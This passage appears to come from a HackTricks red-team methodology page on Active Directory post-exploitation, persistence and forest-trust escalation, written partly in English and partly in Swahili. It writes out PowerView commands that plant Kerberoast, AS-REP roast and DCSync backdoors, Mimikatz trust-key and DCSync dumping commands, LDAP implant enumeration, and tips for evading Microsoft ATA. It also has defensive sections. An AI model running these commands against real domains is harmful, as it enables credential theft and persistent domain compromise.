The compromised user could have some **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Discovering a **Spool service listening** within the domain can be **abused** to **acquire new credentials** and **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

If **other users** **access** the **compromised** machine, it's possible to **gather credentials from memory** and even **inject beacons in their processes** to impersonate them.\
Usually users will access the system via RDP, so here you have how to performa couple of attacks over third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** provides a system for managing the **local Administrator password** on domain-joined computers, ensuring it's **randomized**, unique, and frequently **changed**. These passwords are stored in Active Directory and access is controlled through ACLs to authorized users only. With sufficient permissions to access these passwords, pivoting to other computers becomes possible.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** from the compromised machine could be a way to escalate privileges inside the environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

If **vulnerable templates** are configured it's possible to abuse them to escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Once you get **Domain Admin** or even better **Enterprise Admin** privileges, you can **dump** the **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Some of the techniques discussed before can be used for persistence.\
For example you could:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** creates a **legitimate Ticket Granting Service (TGS) ticket** for a specific service by using the **NTLM hash** (for instance, the **hash of the PC account**). This method is employed to **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** involves an attacker gaining access to the **NTLM hash of the krbtgt account** in an Active Directory (AD) environment. This account is special because it's used to sign all **Ticket Granting Tickets (TGTs)**, which are essential for authenticating within the AD network.

Once the attacker obtains this hash, they can create **TGTs** for any account they choose (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** is a very good way to be able to persist in the users account (even if he changes the password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

The **AdminSDHolder** object in Active Directory ensures the security of **privileged groups** (like Domain Admins and Enterprise Admins) by applying a standard **Access Control List (ACL)** across these groups to prevent unauthorized changes. However, this feature can be exploited; if an attacker modifies the AdminSDHolder's ACL to give full access to a regular user, that user gains extensive control over all privileged groups. This security measure, meant to protect, can thus backfire, allowing unwarranted access unless closely monitored.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Inside every **Domain Controller (DC)**, a **local administrator** account exists. By obtaining admin rights on such a machine, the local Administrator hash can be extracted using **mimikatz**. Following this, a registry modification is necessary to **enable the use of this password**, allowing for remote access to the local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

You could **give** some **special permissions** to a **user** over some specific domain objects that will let the user **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

The **security descriptors** are used to **store** the **permissions** an **object** have **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alter **LSASS** in memory to establish a **universal password**, granting access to all domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
Note that if you use wrong data, pretty ugly logs will appear.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Previously we have discussed about how to escalate privileges if you have **enough permission to read LAPS passwords**. However, these passwords can also be used to **maintain persistence**.\
Check:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft views the **Forest** as the security boundary. This implies that **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is a security mechanism that enables a user from one **domain** to access resources in another **domain**. It essentially creates a linkage between the authentication systems of the two domains, allowing authentication verifications to flow seamlessly. When domains set up a trust, they exchange and retain specific **keys** within their **Domain Controllers (DCs)**, which are crucial to the trust's integrity.

In a typical scenario, if a user intends to access a service in a **trusted domain**, they must first request a special ticket known as an **inter-realm TGT** from their own domain's DC. This TGT is encrypted with a shared **key** that both domains have agreed upon. The user then presents this TGT to the **DC of the trusted domain** to get a service ticket (**TGS**). Upon successful validation of the inter-realm TGT by the trusted domain's DC, it issues a TGS, granting the user access to the service.

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.

If Domain A trusts Domain B, A is the trusting domain and B ins the trusted one. Moreover, in **Domain A**, this would be an **Outbound trust**; and in **Domain B**, this would be an **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: This is a common setup within the same forest, where a child domain automatically has a two-way transitive trust with its parent domain. Essentially, this means that authentication requests can flow seamlessly between the parent and the child.
- **Cross-link Trusts**: Referred to as "shortcut trusts," these are established between child domains to expedite referral processes. In complex forests, authentication referrals typically have to travel up to the forest root and then down to the target domain. By creating cross-links, the journey is shortened, which is especially beneficial in geographically dispersed environments.
- **External Trusts**: These are set up between different, unrelated domains and are non-transitive by nature. According to [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts are useful for accessing resources in a domain outside of the current forest that isn't connected by a forest trust. Security is bolstered through SID filtering with external trusts.
- **Tree-root Trusts**: These trusts are automatically established between the forest root domain and a newly added tree root. While not commonly encountered, tree-root trusts are important for adding new domain trees to a forest, enabling them to maintain a unique domain name and ensuring two-way transitivity. More information can be found in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: This type of trust is a two-way transitive trust between two forest root domains, also enforcing SID filtering to enhance security measures.
- **MIT Trusts**: These trusts are established with non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts are a bit more specialized and cater to environments requiring integration with Kerberos-based systems outside the Windows ecosystem.

#### Other differences in **trusting relationships**

- A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
- A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Kuinua kwa ruhusa kutoka Child-to-Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Njia nyingine za kuorodhesha domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Kuna **funguo 2 zinazoaminika**, moja kwa _Child --> Parent_ na nyingine kwa _Parent_ --> _Child_.\
> Unaweza kutumia ile inayotumiwa na domain ya sasa kwa:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Panda hadi Enterprise admin kama child/parent domain kwa kutumia trust na SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Kuelewa jinsi Configuration Naming Context (NC) inavyoweza kutumiwa vibaya ni muhimu sana. Configuration NC hutumika kama hazina kuu ya data ya usanidi kwenye forest yote katika Active Directory (AD) environments. Data hii huigwa hadi kila Domain Controller (DC) ndani ya forest, huku DCs zinazoweza kuandikwa zikihifadhi nakala inayoweza kuandikwa ya Configuration NC. Ili kuitumia vibaya, lazima uwe na **SYSTEM privileges kwenye DC**, ikiwezekana child DC.

**Link GPO to root DC site**

Configuration NC's Sites container ina taarifa kuhusu sites za kompyuta zote zilizojiunga na domain ndani ya AD forest. Kwa kufanya kazi na SYSTEM privileges kwenye DC yoyote, attackers wanaweza ku-link GPOs kwenye root DC sites. Kitendo hiki kinaweza kuhatarisha root domain kwa kubadilisha policies zinazotumika kwenye sites hizi.

Kwa taarifa za kina, unaweza kuchunguza research kuhusu [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Njia moja ya attack inahusisha kulenga privileged gMSAs ndani ya domain. KDS Root key, muhimu kwa kukokotoa passwords za gMSAs, huhifadhiwa ndani ya Configuration NC. Ukiwa na SYSTEM privileges kwenye DC yoyote, inawezekana kupata KDS Root key na kukokotoa passwords za gMSA yoyote kwenye forest yote.

Uchanganuzi wa kina na mwongozo wa hatua kwa hatua unaweza kupatikana katika:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Njia hii inahitaji subira, ikisubiri uundaji wa AD objects mpya zenye privilege. Ukiwa na SYSTEM privileges, attacker anaweza kurekebisha AD Schema ili kumpa user yeyote control kamili juu ya classes zote. Hii inaweza kusababisha access isiyoidhinishwa na control juu ya AD objects mpya zinazoundwa.

Usomaji zaidi unapatikana kwenye [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Udhaifu wa ADCS ESC5 unalenga control juu ya Public Key Infrastructure (PKI) objects ili kuunda certificate template inayowezesha authentication kama user yeyote ndani ya forest. Kwa kuwa PKI objects ziko ndani ya Configuration NC, ku-compromise writable child DC kunaruhusu utekelezaji wa ESC5 attacks.

Maelezo zaidi kuhusu hili yanaweza kusomwa katika [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Katika scenarios zisizo na ADCS, attacker ana uwezo wa kusanidi vipengele vinavyohitajika, kama ilivyojadiliwa katika [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Katika hali hii **domain yako inaaminika** na nyingine ya nje ikikupa **ruhusa zisizoainishwa** juu yake. Utahitaji kugundua **ni principals gani za domain yako zina access gani juu ya domain ya nje** kisha ujaribu kuitumia vibaya:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Katika hali hii **domain yako** ina **kuamini** baadhi ya **privileges** kwa principal kutoka **different domains**.

Hata hivyo, wakati **domain inapoaminika** na trusting domain, trusted domain **huunda user** yenye **jina linalotabirika** ambalo hutumia **trusted password** kama **password**. Hii inamaanisha kwamba inawezekana **kuaccess user kutoka trusting domain ili kuingia ndani ya ile trusted** kuienumerate na kujaribu kuongeza privileges zaidi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya kucompromise trusted domain ni kupata [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyoundwa katika **mwelekeo wa kinyume** wa domain trust (ambayo si ya kawaida sana).

Njia nyingine ya kucompromise trusted domain ni kusubiri kwenye machine ambapo **user kutoka trusted domain anaweza access** ili kulogin kupitia **RDP**. Kisha, attacker anaweza kuinject code kwenye process ya RDP session na **kuaccess origin domain ya victim** kutoka hapo.\
Zaidi ya hayo, ikiwa **victim ali-mount hard drive yake**, kutoka kwenye process ya **RDP session** attacker anaweza kuhifadhi **backdoors** kwenye **startup folder ya hard drive**. Hii technique inaitwa **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Risk ya attacks zinazotumia SID history attribute kupitia forest trusts hupunguzwa na SID Filtering, ambayo huwashwa kwa default kwenye inter-forest trusts zote. Hii inategemea dhana kwamba intra-forest trusts ni secure, ikichukulia forest, badala ya domain, kama security boundary kulingana na msimamo wa Microsoft.
- Hata hivyo, kuna jambo la kuzingatia: SID filtering inaweza kuharibu applications na user access, hivyo wakati mwingine hulemazwa.

### **Selective Authentication:**

- Kwa inter-forest trusts, kutumia Selective Authentication huhakikisha kwamba users kutoka forests zote mbili hawathibitishwi automatically. Badala yake, permissions za wazi zinahitajika ili users waweze kuaccess domains na servers ndani ya trusting domain au forest.
- Ni muhimu kuzingatia kwamba hatua hizi hazilindi dhidi ya exploitation ya writable Configuration Naming Context (NC) au attacks kwenye trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives za escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) huruhusu operator ku-stage principals mpya au machine accounts popote pale ambapo OU rights zipo. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` hu-hijack targets moja kwa moja mara tu write-property rights zinapopatikana.
- Amri zinazolenga ACL kama `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` hubadilisha WriteDACL/WriteOwner kwenye yoyote AD object kuwa password resets, group membership control, au DCSync replication privileges bila kuacha PowerShell/ADSI artifacts. `remove-*` counterparts husafisha injected ACEs.

### Delegation, roasting, na Kerberos abuse

- `add-spn`/`set-spn` hufanya mara moja user aliye-compromise awe Kerberoastable; `add-asreproastable` (UAC toggle) humweka kwa AS-REP roasting bila kugusa password.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) huandika upya `msDS-AllowedToDelegateTo`, UAC flags, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka beacon, kuwezesha constrained/unconstrained/RBCD attack paths na kuondoa haja ya remote PowerShell au RSAT.

### sidHistory injection, OU relocation, na attack surface shaping

- `add-sidhistory` huingiza privileged SIDs kwenye SID history ya controlled principal (tazama [SID-History Injection](sid-history-injection.md)), ikitoa stealthy access inheritance kikamilifu kupitia LDAP/LDAPS.
- `move-object` hubadilisha DN/OU ya computers au users, ikimruhusu attacker kuvuta assets ndani ya OUs ambako delegated rights tayari zipo kabla ya kutumia `set-password`, `add-groupmember`, au `add-spn`.
- Amri za removal zenye scope ndogo (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, n.k.) huruhusu rollback ya haraka baada ya operator kuvuna credentials au persistence, kupunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Inapendekezwa kwamba Domain Admins waruhusiwe ku-login tu kwenye Domain Controllers, na kuepuka matumizi yao kwenye hosts nyingine.
- **Service Account Privileges**: Services hazipaswi kuendeshwa kwa kutumia Domain Admin (DA) privileges ili kudumisha usalama.
- **Temporal Privilege Limitation**: Kwa kazi zinazohitaji DA privileges, muda wake unapaswa kupunguzwa. Hii inaweza kufanyika kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 kisha enforce LDAP signing pamoja na LDAPS channel binding kwenye DCs/clients ili kuzuia LDAP MITM/relay attempts.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Ukihitaji detect common AD tradecraft, **usitegemee tu operator-controlled artifacts** kama renamed binaries, service names, temp batch files, au output paths. Weka baseline ya jinsi legitimate Windows clients hujenga [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, na WMI traffic, kisha tafuta **implementation quirks** zinazoendelea kuwepo hata baada ya operator ku-edit `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, au `ntlmrelayx.py`.

- **High-confidence standalone candidates** (baada ya kuthibitisha dhidi ya baseline yako mwenyewe):
- Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding filled with `0xff`
- LDAP Kerberos binds that place a raw Kerberos `AP-REQ` directly in SPNEGO `mechToken`
- SMB2/3 negotiate requests with ASCII-looking `ClientGuid` values
- WMI `IWbemLevel1Login::NTLMLogin` using the non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Better as correlation/scoring features**:
- Sparse or duplicated Kerberos etype lists, unusual/missing `PA-DATA`, or TGS-REQ etype ordering that differs from native Windows
- NTLM Type 1 messages missing version info or Type 3 messages with null host names
- Raw NTLMSSP carried in DCE/RPC instead of SPNEGO, missing DCE/RPC verification trailers, or SPNEGO/Kerberos OID mismatches
- Several of these traits from the same host/user/session/time window are far stronger than any single weak field
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, and tool-specific HTTP/WebDAV/RDP/MSSQL strings
- These are easy for operators to change and are best used to explain why a cross-protocol cluster is suspicious
- **Operational notes**:
- Some of these signals require decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, au visibility ya upande wa huduma
- Validate against Samba/Linux clients, appliances, and legacy software before promoting to alerts
- Promote detections from enrichment -> hunting -> alerting as you build confidence in the baseline

### **Implementing Deception Techniques**

- Implementing deception involves setting traps, like decoy users or computers, with features such as passwords that do not expire or are marked as Trusted for Delegation. A detailed approach includes creating users with specific rights or adding them to high privilege groups.
- A practical example involves using tools like: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- More on deploying deception techniques can be found at [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Suspicious indicators include atypical ObjectSID, infrequent logons, creation dates, and low bad password counts.
- **General Indicators**: Comparing attributes of potential decoy objects with those of genuine ones can reveal inconsistencies. Tools like [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) can assist in identifying such deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Kuepuka session enumeration kwenye Domain Controllers ili kuzuia ATA detection.
- **Ticket Impersonation**: Kutumia **aes** keys kwa ticket creation husaidia kukwepa detection kwa kutoshusha hadi NTLM.
- **DCSync Attacks**: Kutekeleza kutoka non-Domain Controller ili kuepuka ATA detection kunashauriwa, kwa kuwa utekelezaji wa moja kwa moja kutoka Domain Controller utaanzisha alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)

{{#include ../../banners/hacktricks-training.md}}
